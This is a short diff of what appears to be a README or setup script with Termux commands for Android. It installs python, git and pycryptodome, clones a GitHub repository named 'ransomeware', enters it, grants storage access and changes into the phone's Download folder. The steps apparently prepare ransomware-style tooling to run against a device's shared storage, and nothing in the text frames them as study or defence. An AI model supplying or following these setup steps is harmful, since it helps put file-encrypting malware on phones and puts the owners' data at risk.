@@ -16,7 +16,9 @@ pkg update && pkg upgrade
 pkg install python
 pkg install git
 pip install pycryptodome
-git clone 
+git clone https://github.com/Abhishek88911/ransomeware.git
+cd ransomeware
+
 termux-setup-storage
 cd /storage/emulated/0/Download
 
